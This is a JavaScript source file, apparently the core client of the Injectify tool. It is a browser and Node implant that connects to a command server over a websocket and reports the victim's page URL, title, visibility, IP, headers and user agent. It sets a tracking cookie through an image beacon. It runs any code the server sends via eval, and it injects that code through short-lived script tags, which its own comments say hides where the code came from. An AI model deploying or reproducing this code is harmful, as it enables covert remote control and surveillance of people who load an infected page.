/**
 * Injectify core API
 * @class
 */
window['injectify'] = /** @class */ (function () {
    function Injectify() {
    }
    /**
     * Overrides the message handler for the websocket connection
     * @param {function} callback Callback to be triggered once message received
     */
    Injectify.listener = function (callback) {
        var _this = this;
        ws.onmessage = function (message) {
            try {
                var data = JSON.parse(message.data);
                if (_this['listeners'] && data.t && _this['listeners'][data.t]) {
                    /**
                     * Pre-process some topic's data
                     */
                    if (data.t == 'pong') {
                        data.d = +new Date - data.d;
                    }
                    /**
                     * Callback the listeners
                     */
                    _this['listeners'][data.t].callback(data.d);
                    if (_this['listeners'][data.t].once)
                        delete _this['listeners'][data.t];
                }
                else {
                    callback(data.d, data.t);
                }
            }
            catch (e) {
                if (_this.debug)
                    throw e;
                _this.error(e.stack);
            }
        };
    };
    /**
     * Listen for a topic from websocket connection
     * @param {string} topic Topic name to listen to
     * @param {function} callback Callback to be triggered once topic received
     */
    Injectify.listen = function (topic, callback, once) {
        if (!once)
            once = false;
        if (!this['listeners'])
            this['listeners'] = {};
        this['listeners'][topic] = {
            callback: function (data) {
                callback(data);
            },
            raw: callback,
            once: once
        };
    };
    /**
     * Unhook a websocket topic listener
     * @param {string} topic Topic name to unlisten
     * @param {function} callback
     */
    Injectify.unlisten = function (topic, callback) {
        /**
         * If the listener is missing, return false
         */
        if (!this['listeners'] ||
            !this['listeners'][topic] ||
            !this['listeners'][topic].callback ||
            !this['listeners'][topic].raw ||
            (callback &&
                callback.toString() !== this['listeners'][topic].raw.toString()))
            return false;
        return delete this['listeners'][topic];
    };
    /**
     * Send data to websocket
     * @param {string} topic Message topic
     * @param {Object} data Message data
     */
    Injectify.send = function (topic, data) {
        /**
         * If the websocket is dead, return
         */
        if (ws.readyState == 0)
            return;
        try {
            ws.send(JSON.stringify({
                t: topic,
                d: data,
            }));
        }
        catch (e) {
            if (this.debug)
                console.error(e);
        }
    };
    /**
     * Log data to websocket connection (and locally)
     * @param {(Object|string)} message Data to be logged
     * @param {boolean} local Whether to log it in the local console
     */
    Injectify.log = function (message, local) {
        this.send('l', message);
        if (local)
            console.log(message);
    };
    /**
     * Get the websocket ping time (in milliseconds)
     * @param {function} callback Callback to be executed on ping complete
     */
    Injectify.ping = function (callback) {
        this.send('ping', +new Date());
        if (callback)
            this.listen('pong', callback, true);
    };
    /**
     * Safely execute a script with hidden context. Appears as 'VMXXX:1' in DevTools
     * @param {string} func the contents inside the <script> tag
     * @param {element} targetParent element to execute the script under, defaults to document.head
     */
    Injectify.exec = function (func, targetParent) {
        if (this.info.platform === 'browser') {
            /**
             * Default o using document.head as the script container
             */
            if (!targetParent)
                targetParent = document.head;
            /**
             * Turn the function into a self-executing constructor
             */
            if (typeof func === 'function')
                func = '(' + func.toString() + ')()';
            /**
             * Create, append & remove a script tag
             */
            var script = document.createElement('script');
            script.innerHTML = func;
            targetParent.appendChild(script);
            targetParent.removeChild(script);
        }
        else {
            if (typeof func === 'string') {
                eval('(' + func + ')()');
            }
            else {
                func();
            }
        }
    };
    /**
     * Loads a module from the injectify server
     * @param {string} name module name
     * @param {(string|Object)} params parameters to be sent to the module
     * @param {function} callback optional callback once the module has been loaded
     */
    Injectify.module = function (name, params, callback, errorCallback) {
        var token = +new Date;
        /**
         * Parse the parameters
         */
        if (typeof params === 'function') {
            callback = params;
            if (typeof callback === 'function')
                window['e' + token] = callback;
        }
        if (typeof callback === 'function')
            window[token] = callback;
        if (typeof errorCallback === 'function')
            window['e' + token] = errorCallback;
        /**
         * Emit to server
         */
        this.send('module', {
            name: name,
            token: token,
            params: params
        });
    };
    /**
     * Injectify authentication API
     */
    Injectify.auth = function (token) {
        var auth = new Image;
        if (token) {
            auth.src = this.info.server.url + '/a?id=' + encodeURIComponent(this.info.id) + '&token=' + encodeURIComponent(token) + '&z=' + +new Date;
        }
        else {
            /**
             * Send a connection request to the server
             *
             * 1. Make a request to /a with our socket connection ID
             * 2. Server reads cookies and attempts to find our token
             * 3. If it can't be found it, the server sets a new cookie
             * 4. Server gets the passed socket ID and inserts us into database
             * 5. All this is done server-side with the below two lines
             */
            auth.src = this.info.server.url + '/a?id=' + encodeURIComponent(this.info.id) + '&z=' + +new Date;
        }
        /**
         * Make sure request is sent
         */
        auth.onload;
    };
    Object.defineProperty(Injectify, "present", {
        /**
         * Check that the Injectify core is active
         */
        get: function () {
            return true;
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "info", {
        /**
         * Returns information about Injectify
         */
        get: function () {
            /**
             * Read the project name from the URL
             */
            var project = ws.url.split('?')[1];
            if (this.debug)
                project = project.substring(1);
            /**
             * Parse the server URL from the websocket url
             */
            var server = ws.url.split('/');
            var protocol = 'https://';
            if (server[0] === 'ws:')
                protocol = 'http://';
            server = protocol + server[2];
            return {
                'project': atob(project),
                'server': {
                    'websocket': ws.url,
                    'url': server
                },
                'id': client.id,
                'platform': client.platform,
                'duration': this.duration,
                'debug': this.debug,
                'os': client.os,
                'ip': client.ip,
                'headers': client.headers,
                'user-agent': client.agent
            };
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "sessionInfo", {
        /**
         * Returns information about the current session, browser etc.
         */
        get: function () {
            if (this.info.platform === 'browser') {
                /**
                 * Get the correct document.hidden method
                 */
                var hidden = 'hidden';
                if ('mozHidden' in document) {
                    hidden = 'mozHidden';
                }
                else if ('webkitHidden' in document) {
                    hidden = 'webkitHidden';
                }
                else if ('msHidden' in document) {
                    hidden = 'msHidden';
                }
                /**
                 * Return object
                 */
                return {
                    'window': {
                        'url': window.location.href,
                        'title': document.title ? document.title : window.location.host + window.location.pathname,
                        'active': !document[hidden],
                    }
                };
            }
            else {
                return {
                    'window': {
                        'url': require('file-url')(process.cwd()),
                        'title': process.cwd(),
                        'active': true,
                    }
                };
            }
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "debug", {
        /**
         * Returns whether injectify is in debug mode or not
         * true  - being used in development
         * false - console output should be suppressed
         */
        get: function () {
            return ws.url.split('?')[1].charAt(0) == "$";
        },
        enumerable: true,
        configurable: true
    });
    Object.defineProperty(Injectify, "duration", {
        /**
         * Returns the amount of time connected to injectify server
         */
        get: function () {
            var duration = (+new Date - this['connectTime']) / 1000;
            return Math.round(duration);
        },
        enumerable: true,
        configurable: true
    });
    /**
     * Error handler
     * @param {error} error The error to be handled
     */
    Injectify.error = function (error) {
        // this['errorLimiting']++
        // if (this['errorLimiting'] >= 20) {
        // 	setTimeout(function() {
        // 		console.log('called!')
        // 		this['errorLimiting'] = 0
        // 	}, 100)
        // } else {
        this.send('e', error);
        // }
    };
    return Injectify;
}());
/**
 * Create local reference to window.injectify
 */
var injectify = window['injectify'];
/**
 * Set the connect time
 */
injectify.connectTime = +new Date;
/**
 * Debug helpers
 */
if (injectify.debug) {
    console.warn('⚡️ Injectify core.js loaded! --> https://github.com/samdenty99/injectify', injectify.info);
}
/**
 * Send session info to the Injectify server
 */
injectify.send('i', injectify.sessionInfo);
console.log(injectify.sessionInfo);
/**
 * Replace the basic websocket handler with a feature-rich one
 */
injectify.listener(function (data, topic) {
    try {
        if (topic == 'stay-alive') {
            return;
        }
        if (topic == 'error') {
            injectify.exec('console.error(' + JSON.stringify(data) + ')');
            return;
        }
        if (topic == 'module') {
            /**
             * Create the module object
             */
            var module = {
                name: data.name,
                token: data.token,
                callback: window[data.token],
                returned: undefined,
                config: {
                    async: false
                }
            };
            if (!data.error) {
                /**
                 * Evaluate the script
                 */
                eval(data.script);
                /**
                 * If in debug mode display verbose output
                 */
                if (injectify.debug) {
                    console.warn('📦 Executed module "' + module.name + '"', module);
                }
                /**
                 * If the module isn't asynchronous call it's callback
                 */
                if (!module.config.async && data !== false && typeof module.callback == 'function') {
                    module.callback(module.returned);
                }
                /**
                 * Delete it's synchronous callback
                 */
                return delete window[data.token];
            }
            else if (injectify.debug && data.error.message) {
                console.error('📦 ' + data.error.message, module);
            }
        }
        if (topic == 'execute' || topic == 'core') {
            eval(data);
        }
    }
    catch (e) {
        injectify.error(e.stack);
    }
});
/**
 * Page Visibility API
 */
(function () {
    if (injectify.info.platform === 'browser') {
        var listener = void 0;
        var focusChange = function () { return injectify.send('i', injectify.sessionInfo); };
        /**
         * Get the correct hidden listener
         */
        if ('hidden' in document) {
            listener = 'visibilitychange';
        }
        else if ('mozHidden' in document) {
            listener = 'mozvisibilitychange';
        }
        else if ('webkitHidden' in document) {
            listener = 'webkitvisibilitychange';
        }
        else if ('msHidden' in document) {
            listener = 'msvisibilitychange';
        }
        else {
            window.onpageshow = window.onpagehide = window.onfocus = window.onblur = focusChange;
        }
        /**
         * Add listener
         */
        if (listener)
            document.addEventListener(listener, focusChange);
    }
})();
/**
 * Ping the server every 5 seconds to sustain the connection
 */
clearInterval(window['ping']);
window['ping'] = setInterval(function () {
    injectify.send('heartbeat');
}, 10 * 1000);
